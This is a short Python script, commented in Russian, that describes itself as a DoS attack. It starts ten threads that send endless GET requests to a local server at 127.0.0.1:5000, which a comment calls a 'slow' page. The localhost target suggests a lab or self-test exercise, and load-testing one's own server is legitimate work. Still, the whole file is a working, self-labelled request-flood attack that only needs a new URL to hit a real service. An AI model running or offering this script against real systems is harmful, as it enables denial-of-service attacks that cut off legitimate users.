import requests
import threading
import time
#def test():
#    response = requests.get('http://127.0.0.1:8000/')
#    print(response.status_code)  # Статус ответа (200 — OK)
#    print(response.text)
#

#test()


TARGET_URL = "http://127.0.0.1:5000/"
NUM_THREADS = 10  # Количество потоков, которые будут отправлять запросы
REQUEST_INTERVAL = 0.5  # Пауза между запросами внутри одного потока (чтобы не убить атакующий комп)

print(f"[*] Запуск DoS-атаки на {TARGET_URL}")
print(f"[*] Используется {NUM_THREADS} потоков.")


def attack_thread():
    thread_id = threading.get_ident()
    while True:
        try:
            # Отправляем GET-запрос на "медленную" страницу
            response = requests.get(TARGET_URL, timeout=5)  # Таймаут 5 сек
            if response.status_code == 200:
                print(f"[{thread_id}] Запрос успешен, время ответа: {response.elapsed.total_seconds()} сек.")
            else:
                print(f"[{thread_id}] Ошибка: статус {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[{thread_id}] Ошибка соединения: {e}")

        time.sleep(REQUEST_INTERVAL)  # Небольшая пауза, чтобы не перегрузить свой клиентский комп


threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=attack_thread)
    t.daemon = True  # Поток завершится, когда основная программа завершится
    t.start()
    threads.append(t)

# Держим основной поток активным
try:
    while True:
        time.sleep(1)
        # Можно добавить сюда логику для проверки, как долго длится атака, или для остановки
        # Например, если атакующий комп начинает тормозить, можно уменьшить NUM_THREADS или REQUEST_INTERVAL
        pass
except KeyboardInterrupt:
    print("\n[*] Атака остановлена пользователем.")
